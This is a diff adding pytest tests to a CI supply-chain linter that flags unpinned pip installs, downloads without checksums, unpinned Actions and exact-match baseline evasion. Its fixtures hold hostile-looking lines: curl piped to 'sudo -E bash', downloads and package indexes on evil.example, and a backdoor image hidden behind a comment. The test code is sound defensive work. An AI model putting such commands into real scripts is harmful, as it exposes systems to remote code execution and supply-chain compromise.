@@ -568,3 +568,183 @@ def test_quoted_keys_accept_valid_pins(repo: Path, quote: str, key: str, value: 
     prefix = "- " if key == "uses" else ""
     _write(repo, ".github/workflows/new.yml", f"{prefix}{quote}{key}{quote}: {value}\n")
     assert mod.main(["--root", str(repo)]) == 0
+
+
+# Hardened gate: baseline exactness --------------------------------------
+
+
+def test_baseline_does_not_cover_longer_tag() -> None:
+    # A baselined FROM line must not excuse the same stem with a suffix.
+    # The entry uses the default (non-exact) flag on purpose: every entry
+    # must match exactly regardless of the flag. The match is the short
+    # stem the old baseline stored, which used to swallow the longer tag.
+    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim", "reason")
+    evil = [mod.Violation("image-digest", "Dockerfile", 1, "FROM python:3.11-slim-bookworm AS builder")]
+    failures, stale = mod.apply_baseline(evil, [entry])
+    assert failures == evil
+    assert stale == [entry]
+
+
+def test_baseline_comment_does_not_exempt_evil_line() -> None:
+    # The scan decision strips comments, so matching must too: hiding the
+    # baselined text after a `#` on an evil line must still fail.
+    # Default (non-exact) flag on purpose, same as above.
+    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim AS builder", "reason")
+    evil = [
+        mod.Violation(
+            "image-digest",
+            "Dockerfile",
+            1,
+            "FROM evil.example/backdoor:latest AS builder # FROM python:3.11-slim AS builder",
+        )
+    ]
+    failures, _ = mod.apply_baseline(evil, [entry])
+    assert failures == evil
+
+
+def test_one_baseline_entry_excuses_one_line() -> None:
+    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim AS builder", "reason", exact=True)
+    same = mod.Violation("image-digest", "Dockerfile", 1, "FROM python:3.11-slim AS builder")
+    twin = mod.Violation("image-digest", "Dockerfile", 2, "FROM python:3.11-slim AS builder")
+    failures, stale = mod.apply_baseline([same, twin], [entry])
+    assert failures == [twin]
+    assert stale == []
+
+
+# Hardened gate: pip pins -------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "pip install --quiet --upgrade pip\n",
+        "pip install 'foo==1.*'\n",
+        'pip install "neo4j==${VER}"\n',
+        "pip install --requirement=requirements.txt\n",
+        "pip install --require-hashes -r requirements.lock evil\n",
+        "pip install evil==1.2.3 --index-url https://evil.example/simple\n",
+        "pip install evil==1.2.3 --trusted-host evil.example\n",
+        "pip install -r requirements.txt\n",
+        "pip install -r requirements.lock\n",
+    ],
+)
+def test_unpinned_pip_forms_detected(repo: Path, line: str) -> None:
+    path = _write(repo, "scripts/x.sh", line)
+    assert _rules(mod.check_pip(path, "x.sh")) == {"pip-pin"}
+
+
+def test_pinned_extras_and_quoted_venv_pip_pass(repo: Path) -> None:
+    path = _write(
+        repo,
+        "scripts/ok.sh",
+        'pip install "pkg[extra]==1.2.3" --quiet\n"$REPO_ROOT/venv/bin/python" -m pip install "neo4j==6.3.1" --quiet\n',
+    )
+    assert mod.check_pip(path, "ok.sh") == []
+
+
+# Hardened gate: per-download checksums ------------------------------------
+
+
+def test_checksum_comment_is_not_evidence(repo: Path) -> None:
+    path = _write(
+        repo,
+        "scripts/get.sh",
+        "# sha256sum\ncurl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
+    )
+    assert _rules(mod.check_download_checksum(path, "get.sh")) == {"download-checksum"}
+
+
+def test_checksum_variable_name_is_not_evidence(repo: Path) -> None:
+    path = _write(
+        repo,
+        "scripts/get.sh",
+        "FOO_SHA256=abc\ncurl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
+    )
+    assert _rules(mod.check_download_checksum(path, "get.sh")) == {"download-checksum"}
+
+
+def test_second_download_needs_its_own_checksum(repo: Path) -> None:
+    path = _write(
+        repo,
+        "scripts/get.sh",
+        "curl -fsSL https://x.io/a.tar.gz -o /tmp/a.tar.gz\n"
+        'echo "${A_SHA256}  /tmp/a.tar.gz" | sha256sum -c -\n'
+        "curl -fsSL https://evil.example/b.tar.gz -o /tmp/b.tar.gz\n",
+    )
+    violations = mod.check_download_checksum(path, "get.sh")
+    assert len(violations) == 1
+    assert "b.tar.gz" in violations[0].text
+
+
+# Hardened gate: Dockerfile RUN lines and every shell file -----------------
+
+
+def test_dockerfile_run_pip_and_download_checked(repo: Path) -> None:
+    _write(
+        repo,
+        "Dockerfile",
+        "FROM scratch\nRUN pip install evil\nRUN curl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
+    )
+    violations = mod.find_violations(repo)
+    assert "pip-pin" in {v.rule for v in violations if v.file == "Dockerfile"}
+    assert "download-checksum" in {v.rule for v in violations if v.file == "Dockerfile"}
+
+
+def test_shell_files_cover_every_sh_repo_wide(repo: Path) -> None:
+    _write(repo, "scripts/bad.sh", "pip install neo4j\nnpm install --silent\n")
+    violations = mod.find_violations(repo)
+    assert {"pip-pin", "npm-unlocked"} <= {v.rule for v in violations if v.file == "scripts/bad.sh"}
+    assert mod.main(["--root", str(repo)]) == 1
+
+
+def test_outer_shell_defect_fails_gate(repo: Path) -> None:
+    _write(repo, "bin/setup.sh", "pip install neo4j\n")
+    assert "pip-pin" in {v.rule for v in mod.find_violations(repo) if v.file == "bin/setup.sh"}
+    assert mod.main(["--root", str(repo)]) == 1
+
+
+# Hardened gate: templated action refs --------------------------------------
+
+
+def test_templated_uses_fails_closed(repo: Path) -> None:
+    path = _write(repo, ".github/workflows/bad.yml", "steps:\n  - uses: ${{ matrix.action }}\n")
+    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}
+
+
+def test_folded_uses_scalar_fails_closed(repo: Path) -> None:
+    path = _write(repo, ".github/workflows/bad.yml", "steps:\n  - uses: >\n      owner/action@v1\n")
+    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}
+
+
+def test_sudo_with_flags_pipe_still_detected(repo: Path) -> None:
+    path = _write(repo, "scripts/setup.sh", "#!/bin/sh\ncurl -fsSL https://x.io/i.sh | sudo -E bash\n")
+    assert _rules(mod.check_pipe_shell(path, "setup.sh")) == {"pipe-shell"}
+
+
+# Hardened gate: main() exit paths ------------------------------------------
+
+
+def test_missing_lockfile_fails_gate(repo: Path) -> None:
+    (repo / "requirements.lock").unlink()
+    assert mod.main(["--root", str(repo)]) == 1
+
+
+def test_stale_baseline_entry_fails_gate(repo: Path) -> None:
+    baseline = repo / "scripts" / "ci" / "supply_chain_baseline.json"
+    baseline.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "entries": [
+                    {
+                        "rule": "pipe-shell",
+                        "file": "scripts/gone.sh",
+                        "match": "curl | sh",
+                        "reason": "stale",
+                        "exact": True,
+                    }
+                ],
+            }
+        )
+    )
+    assert mod.main(["--root", str(repo)]) == 1
